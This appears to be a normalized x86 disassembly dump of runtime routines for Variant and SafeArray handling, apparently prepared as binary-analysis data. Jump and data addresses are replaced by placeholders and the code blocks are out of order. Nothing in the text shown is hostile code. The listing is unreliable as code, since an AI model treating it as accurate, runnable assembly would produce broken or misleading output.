sub_4136cc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f16c
sub_4136ec
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f16c
sub_413718
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40f16c
sub_41373c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f16c
sub_413768
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f16c
sub_413794
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f16c
sub_4137c0
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40f16c
sub_413824
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403ff0
pop esi
pop ebx
retn
mov eax ebx
call sub_40f16c
sub_413850
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413893
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404200
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41389a
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_4138a0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_4048a4
pop esi
pop ebx
retn
mov eax ebx
call sub_40f16c
sub_4138d8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4059e4
pop esi
pop ebx
retn
mov eax ebx
call sub_40f16c
sub_413904
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4059e4
pop esi
pop ebx
retn
mov eax ebx
call sub_40f16c
sub_413930
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413973
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4047f4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4138a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41397a
lea eax [ ebp - 0x4 ]
call sub_4046a8
retn
sub_413980
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4139d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f510
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f510
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4139dd
lea eax [ ebp - 0x10 ]
call sub_40f1e8
retn
sub_4139ec
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ ebx ] 0x400c
jne r-xdata
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4139ec
jmp r-xdata
mov di [ ebx ]
movzx eax di
cmp eax 0x14
jg r-xdata
mov eax esi
call sub_40f16c
pop edx
pop edi
pop esi
pop ebx
retn
sub eax 0x100
je r-xdata
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_413930
jmp r-xdata
dec eax
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
mov edx ebx
mov eax esi
call sub_413980
jmp r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebx + 0x8 ] 0x7fffffff
ja r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40fa54
jmp r-xdata
je r-xdata
test di 0x2000
je r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40fa54
jmp r-xdata
cmp [ ebx + 0xc ] 0xffffffff
jne r-xdata
jmp r-xdata
test [ ebx + 0xb ] 0x80
je r-xdata
jmp r-xdata
mov eax edi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov ecx sub_4139e4
mov edx ebx
mov eax esi
call sub_40f290
jmp r-xdata
jl r-xdata
cmp [ ebx + 0x8 ] 0x80000000
jb r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40fa54
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40fa54
jmp r-xdata
mov edx esp
mov eax edi
call sub_415874
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_40f510
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40fa54
jmp r-xdata
jmp r-xdata
call sub_40e9b0
mov ecx ebx
mov edx esi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
sub_413cc0
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413de6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403ff0
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff0
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_415874
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff0
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042a8
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_4083c8
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4042a8
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40319c
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_40294c
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404200
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413ded
lea eax [ ebp - 0x208 ]
call sub_403f9c
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042a8
sub_413e90
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_413e64
test al al
jne r-xdata
mov eax esi
mov edx edi
call sub_403ff0
mov eax esi
mov edx ebx
call sub_412778
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_413ebc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413f05
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4047f4
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_413f14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413f0c
lea eax [ ebp - 0x4 ]
call sub_4046a8
retn
sub_413f14
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_413e64
test al al
jne r-xdata
mov eax esi
mov edx edi
call sub_4046e4
mov eax esi
mov edx ebx
call sub_412ea0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_413f64
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_413f64
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_413fa8
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
mov [ ebp - 0x2 ] cx
mov ebx edx
mov esi eax
test bl 0x1
je r-xdata
call sub_40eb90
cmp ebx 0x7f
jg r-xdata
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
adc ebx 0x0
mov ax [ ebp - 0x2 ]
call sub_414120
test al al
jne r-xdata
lea eax [ ebp - 0x208 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0x2 ]
push eax
call SafeArrayCreate
mov ebx eax
test ebx ebx
jne r-xdata
inc ebx
lea edx [ ebp - 0x208 ]
mov eax esi
inc ebx
sar ebx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
call sub_40f1e8
mov ax [ ebp - 0x2 ]
or ax 0x2000
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40eb90
mov ecx edx
mov esi [ eax ]
mov [ ecx + 0x4 ] esi
mov esi [ eax + 0x4 ]
sub esi [ ecx + 0x4 ]
inc esi
mov [ ecx ] esi
add eax 0x8
add edx 0x8
dec ebx
jne r-xdata
sub_414050
push ebx
add esp 0xfffffff8
mov ebx eax
mov ecx esp
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_413f64
test al al
jne r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax 0x80070057
call sub_40ee38
sub_414078
push ebx
add esp 0xfffffff8
mov ebx eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_413f64
test al al
je r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
movzx eax [ eax ]
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_4140a0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push esi
mov eax ebx
call sub_414050
push eax
call SafeArrayGetLBound
call sub_40ee38
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_4140c4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push esi
mov eax ebx
call sub_414050
push eax
call SafeArrayGetUBound
call sub_40ee38
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_4140e8
push ebx
push ecx
mov ebx eax
push esp
mov eax ebx
call sub_414050
push eax
call SafeArrayAccessData
call sub_40ee38
mov eax [ esp ]
pop edx
pop ebx
retn
sub_414140
push ebx
push esi
mov ebx eax
movzx esi bx
and esi 0xffffbfff
mov eax esi
sub eax 0x16
jae r-xdata
mov eax ebx
call sub_413e44
test al al
jne r-xdata
lea eax [ esi + esi * 2 ]
mov edx [ rw-data ]
cmp [ edx + eax * 4 + 0x1 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_41417c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x12 ]
mov eax [ ebp + 0xc ]
call sub_413f64
test al al
jne r-xdata
mov eax [ ebp - 0x18 ]
movzx eax [ eax ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax 0x80070057
call sub_40ee38
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41423c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bx [ ebp - 0x12 ]
and bx 0xfff
movzx ebx bx
cmp ebx 0xc
jne r-xdata
mov eax 0x8002000b
call sub_40ee38
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayGetElement
call sub_40ee38
mov [ ebp - 0x10 ] bx
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ee38
mov eax [ ebp - 0x1c ]
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40f510
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_40f510
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414243
lea eax [ ebp - 0x10 ]
call sub_40f1e8
retn
sub_414248
push ebp
mov ebp esp
push ebx
mov ebx ecx
inc ebx
jle r-xdata
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41417c
lea esp [ esp + ebx * 4 + 0xc ]
pop ebx
pop ebp
retn 0x4
push [ edx + ecx * 4 ]
dec ecx
jns r-xdata
sub_41426c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x12 ]
mov eax [ ebp + 0x8 ]
call sub_413f64
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x1a ]
mov eax esi
call sub_413f64
test al al
jne r-xdata
mov eax 0x80070057
call sub_40ee38
mov eax [ ebp - 0x18 ]
movzx eax [ eax ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ax [ ebp - 0x1a ]
call sub_414140
test al al
jne r-xdata
mov bx [ ebp - 0x12 ]
and bx 0xfff
movzx ebx bx
cmp ebx 0xc
jne r-xdata
mov eax 0x8002000b
call sub_40ee38
cmp [ ebp - 0x1a ] 0x100
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4143a4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0xc
jne r-xdata
cmp [ ebp - 0x1a ] 0x100
jne r-xdata
mov eax 0x80020005
call sub_40ee38
mov edx esi
lea eax [ ebp - 0x10 ]
mov ecx ebx
call sub_40fa54
add ebx 0xfffffff8
sub ebx 0x2
jb r-xdata
mov edx esi
lea eax [ ebp - 0x10 ]
call j_sub_40f7a4
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ee38
mov eax [ ebp - 0x24 ]
mov edx esi
call sub_40f510
jmp r-xdata
mov ax [ ebp - 0x1a ]
call sub_413e44
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
sub ebx 0x3
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPutElement
call sub_40ee38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_40f1e8
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
sub_4143b4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
js r-xdata
mov ebx [ ebp + 0x8 ]
inc ebx
push ebx
push edx
push eax
call sub_41426c
lea esp [ esp + ebx * 4 + 0xc ]
pop ebx
pop ebp
retn 0x4
push [ ecx + ebx * 4 ]
dec ebx
jns r-xdata
sub_4143dc
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi [ ebp + 0x8 ]
mov ebp eax
xor ebx ebx
test ecx ecx
jge r-xdata
xor eax eax
mov al [ edi + 0x1 ]
add edi eax
mov eax [ esi + ebx * 4 ]
mul [ edi + 0x2 ]
mov edi [ edi + 0x6 ]
test edi edi
je r-xdata
mov ebp [ ebp ]
add ebp eax
inc ebx
cmp ebx ecx
jle r-xdata
mov edi [ edi ]
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_414458
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] 0x1
mov ebx eax
mov eax edx
call sub_414438
dec eax
test eax eax
jle r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] eax
dec [ esp + 0x4 ]
jne r-xdata
mov eax ebx
call sub_414450
mov esi eax
mov eax [ ebx ]
call sub_414450
mov ebp eax
dec esi
test esi esi
jle r-xdata
test ebx ebx
je r-xdata
mov ebx [ ebx ]
mov edi 0x1
inc edi
dec esi
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov eax [ ebx + edi * 4 ]
call sub_414450
cmp ebp eax
je r-xdata
sub_4144c0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
call sub_414438
mov esi eax
push esi
mov eax ebp
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405200
add esp 0x4
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_414450
dec eax
mov edx [ ebp ]
mov [ edx + edi * 4 ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
sub_414514
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ edi ]
call sub_40504c
mov edx eax
test edx edx
jl r-xdata
test bl bl
je r-xdata
inc edx
xor eax eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
call sub_40504c
cmp eax 0x0
jl r-xdata
inc eax
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov edx [ edi ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
mov ecx [ edi ]
cmp [ ecx + eax * 4 ] 0x0
je r-xdata
mov edx [ edi ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
mov edx [ edi ]
dec [ edx + eax * 4 ]
jmp r-xdata
mov edx [ esi + eax * 4 ]
mov ecx [ edi ]
mov [ ecx + eax * 4 ] edx
dec eax
mov edx [ edi ]
dec [ edx + eax * 4 ]
jmp r-xdata
sub_414580
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi eax
mov eax edx
call sub_414438
mov ebp eax
mov eax ebp
add eax eax
push eax
mov eax edi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405200
add esp 0x4
xor ebx ebx
jmp r-xdata
mov eax ebp
add eax eax
cmp ebx eax
jl r-xdata
mov eax [ edi ]
xor edx edx
mov [ eax + ebx * 4 ] edx
inc ebx
test esi esi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov eax esi
call sub_414450
dec eax
mov edx [ edi ]
mov [ edx + ebx * 4 ] eax
mov esi [ esi ]
sub_4145d8
push ebx
mov ebx 0x1
test eax eax
je r-xdata
cmp ebx 0x1
jle r-xdata
cmp [ eax ] 0x11
jne r-xdata
call sub_40e9b0
cmp ebx 0xe
je r-xdata
xor edx edx
mov dl [ eax + 0x1 ]
add eax edx
mov ebx [ eax + 0xa ]
cmp ebx 0x48
jne r-xdata
cmp ebx 0xf
je r-xdata
mov ebx 0x100
cmp ebx 0x14
jle r-xdata
mov eax ebx
pop ebx
retn
cmp ebx 0x100
je r-xdata
sub_414620
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414962
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405320
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_405320
mov eax [ ebp - 0x4 ]
call sub_40f1e8
mov ebx esi
mov eax ebx
call sub_4145d8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x100
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x18 ] 0x8
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_414580
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax edi
call sub_4144c0
lea ecx [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov eax [ ebp - 0xc ]
call sub_40520c
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40504c
mov edx eax
mov cx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_413fa8
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_40f510
mov eax [ ebp - 0x4 ]
call sub_4140e8
xor eax eax
push ebp
push sub_414927
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax edi
call sub_414458
test al al
je r-xdata
mov eax ebx
call sub_414438
dec eax
jle r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_414514
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xb
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414969
lea eax [ ebp - 0x38 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x3
call sub_404a50
retn
push esi
mov eax [ ebp - 0x10 ]
call sub_40504c
mov ecx eax
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4143dc
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414108
retn
cmp eax 0x12
jg r-xdata
je r-xdata
sub eax 0x13
je r-xdata
je r-xdata
lea eax [ ebp - 0x28 ]
mov dx [ ebx ]
neg dx
sbb edx edx
neg edx
call sub_4137c0
jmp r-xdata
cmp eax 0xa
ja r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0x4
call sub_4135f0
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
movzx edx [ ebx ]
mov cl 0x2
call sub_4135f0
jmp r-xdata
sub eax 0xc
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_40504c
push eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_4143b4
lea eax [ ebp - 0x28 ]
call sub_40f1e8
jmp [ eax * 4 + jump_table_414750 ]
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
push edx
push eax
lea eax [ ebp - 0x28 ]
call sub_4136ec
jmp r-xdata
sub eax 0xec
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx ebx
call sub_40f510
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
movsx edx [ ebx ]
mov cl 0xfe
call sub_4135f0
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0xfc
call sub_4135f0
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_4137e8
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_4137e8
jmp r-xdata
fild [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413810
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_4137e8
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_4138a0
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413904
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0xfc
call sub_4135f0
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413824
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_4138d8
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x28 ]
movsx edx [ ebx ]
mov cl 0xff
call sub_4135f0
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
xor edx edx
mov dl [ ebx ]
mov cl 0x1
call sub_4135f0
jmp r-xdata
jmp r-xdata
sub_414970
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414c71
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_414078
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4140e8
xor edx edx
push ebp
push sub_414c41
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4027b4
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
mov eax 0x80070057
call sub_40ee38
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov ebx edi
mov edx ebx
call sub_405074
mov eax ebx
call sub_414438
mov eax ebx
call sub_4145d8
mov esi eax
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx edi
call sub_4144c0
lea ecx [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov eax [ ebp - 0x14 ]
call sub_40520c
inc esi
xor ebx ebx
cmp eax 0x12
jg r-xdata
je r-xdata
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x8 ]
call sub_4140c4
push eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x8 ]
call sub_4140a0
pop edx
sub edx eax
inc edx
mov eax [ ebp - 0x10 ]
mov [ eax + ebx * 4 ] edx
inc ebx
dec esi
jne r-xdata
sub eax 0x13
je r-xdata
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_411220
mov [ ebx ] ax
jmp r-xdata
cmp eax 0xa
ja r-xdata
lea eax [ ebp - 0x28 ]
call sub_4108dc
mov [ ebx ] eax
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_40fe18
mov [ ebx ] ax
jmp r-xdata
sub eax 0xc
je r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_414514
test al al
jne r-xdata
jmp [ eax * 4 + jump_table_414a9f ]
lea eax [ ebp - 0x28 ]
call sub_4108dc
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
jmp r-xdata
sub eax 0xec
je r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_40f510
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_40504c
mov ecx eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
call sub_414248
push edi
mov eax [ ebp - 0x18 ]
call sub_40504c
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
call sub_4143dc
mov ebx eax
mov eax esi
cmp eax 0xb
jg r-xdata
mov eax [ ebp - 0x10 ]
call sub_4027d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c48
mov eax [ ebp - 0x8 ]
